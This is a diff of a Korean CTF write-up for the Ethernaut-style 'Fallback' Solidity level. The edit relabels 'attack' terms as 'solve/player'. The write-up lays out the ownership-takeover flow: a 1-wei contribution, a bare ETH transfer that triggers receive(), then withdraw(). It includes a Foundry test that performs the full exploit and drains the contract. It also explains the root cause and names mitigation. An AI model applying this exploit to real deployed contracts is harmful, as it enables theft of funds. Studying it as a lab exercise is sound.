@@ -55,41 +55,41 @@ receive() external payable {
 
 소유권 이전을 ETH 수신 로직에 직접 연결했으며, 별도의 명시적인 승인이나 기존 소유자의 검증이 없습니다.
 
-## 공격 흐름
+## 풀이 흐름
 
 ```text
-공격자에게 테스트 ETH 지급
+플레이어에게 테스트 ETH 지급
         ↓
 contribute()에 1 wei 전송
         ↓
-contributions[attacker] > 0 충족
+contributions[player] > 0 충족
         ↓
 빈 calldata와 1 wei를 컨트랙트에 전송
         ↓
 receive() 실행
         ↓
-owner = attacker
+owner = player
         ↓
 withdraw() 호출
         ↓
-컨트랙트 잔액 전부 인출
+컨트랙트 잔액 인출
 ```
 
-## Foundry 공격 코드
+## Foundry 풀이 코드
 
 ```solidity
-function testExploit() public {
-    vm.startPrank(attacker);
+function testSolve() public {
+    vm.startPrank(player);
 
-    fallback_contract.contribute{value: 1 wei}();
+    target.contribute{value: 1 wei}();
 
-    (bool success,) = address(fallback_contract).call{value: 1 wei}("");
-    require(success, "ETH send fail");
+    (bool success,) = address(target).call{value: 1 wei}("");
+    require(success, "ETH transfer failed");
 
-    assertEq(fallback_contract.owner(), attacker);
+    assertEq(target.owner(), player);
 
-    fallback_contract.withdraw();
-    assertEq(address(fallback_contract).balance, 0);
+    target.withdraw();
+    assertEq(address(target).balance, 0);
 
     vm.stopPrank();
 }
@@ -109,7 +109,7 @@ address(target).call{value: 1 wei}("");
 
 근본 원인은 단순한 ETH 수신과 중요한 권한 변경을 같은 함수에서 처리한 것입니다.
 
-`receive()`는 ETH를 받는 역할만 수행해야 하지만, 이 컨트랙트는 기여 이력만 확인한 뒤 호출자를 소유자로 지정합니다. 공격자는 매우 적은 금액으로 기여 조건을 만들고 소유권을 탈취할 수 있습니다.
+`receive()`는 ETH를 받는 역할만 수행해야 하지만, 이 컨트랙트는 기여 이력만 확인한 뒤 호출자를 소유자로 지정합니다. 권한이 없는 호출자도 매우 적은 금액으로 기여 조건을 만들고 소유권을 가져올 수 있습니다.
 
 ## 권장 완화 방법
 
@@ -125,10 +125,10 @@ address(target).call{value: 1 wei}("");
 forge test --match-path test/01_Fallback.t.sol -vvv
 ```
 
-공격 실행 과정을 자세히 확인하려면:
+풀이 실행 과정을 자세히 확인하려면:
 
 ```bash
-forge test --match-test testExploit -vvvv
+forge test --match-test testSolve -vvvv
 ```
 
 ## 학습 정리
